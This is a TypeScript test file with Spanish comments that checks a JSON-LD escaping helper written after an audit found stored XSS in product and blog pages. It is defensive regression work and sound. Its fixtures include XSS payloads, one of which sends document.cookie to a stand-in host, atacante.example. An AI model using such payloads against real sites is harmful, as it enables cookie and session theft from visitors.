import { test } from "node:test";
import assert from "node:assert/strict";
import { escapeJsonForScriptTag } from "./json-ld";

// Auditoría de seguridad (sep. 2026): JsonLd (usado por app/producto/[slug]
// y app/blog/[slug] con contenido escrito por un admin sin sanitizar) hacía
// dangerouslySetInnerHTML={{ __html: JSON.stringify(data) }} directo -- si
// data contenía la subcadena de cierre de un <script>, el navegador cortaba
// el <script type="application/ld+json"> ahí mismo y ejecutaba cualquier
// <script> inyectado después (stored XSS, sin interacción, para cualquier
// visitante de esa ficha de producto/post). Este archivo prueba el helper
// de escapado en aislado.
//
// Cómo correrlo:
//   node --import tsx --test lib/seo/json-ld.test.ts

test("escapa la secuencia de cierre de script para que no sobreviva literal en el HTML", () => {
  const malicious = {
    name: "Bikini</script><script>alert(document.cookie)</script>",
  };
  const escaped = escapeJsonForScriptTag(JSON.stringify(malicious));
  assert.equal(
    escaped.includes("</script>"),
    false,
    "la secuencia de cierre literal no debe sobrevivir",
  );
  assert.equal(escaped.includes("<script>alert"), false);
});

test("el JSON escapado sigue siendo JSON válido y decodifica al mismo valor original", () => {
  const original = {
    name: "Bikini</script><script>alert(1)</script>",
    description: "normal, sin < ni > acá",
  };
  const escaped = escapeJsonForScriptTag(JSON.stringify(original));
  const parsed = JSON.parse(escaped);
  assert.deepEqual(
    parsed,
    original,
    "el escapado nunca debe cambiar el valor real, solo la representación en bytes",
  );
});

test("no toca contenido normal sin '<' -- nunca escapa de más", () => {
  const normal = {
    name: "BIKINI FOAM",
    description: "Inspirado en la espuma del mar.",
  };
  const json = JSON.stringify(normal);
  assert.equal(escapeJsonForScriptTag(json), json);
});

test("caso concreto del hallazgo: nombre de producto con payload de robo de cookie no ejecuta", () => {
  const productLike = {
    "@context": "https://schema.org",
    "@type": "Product",
    name: "Bikini</script><script>fetch('https://atacante.example/c?c='+document.cookie)</script>",
  };
  const html = escapeJsonForScriptTag(JSON.stringify(productLike));
  // El navegador solo cierra un <script> en la secuencia LITERAL "</script"
  // (case-insensitive) -- confirmamos que esa secuencia exacta ya no existe.
  assert.doesNotMatch(html, /<\/script/i);
});
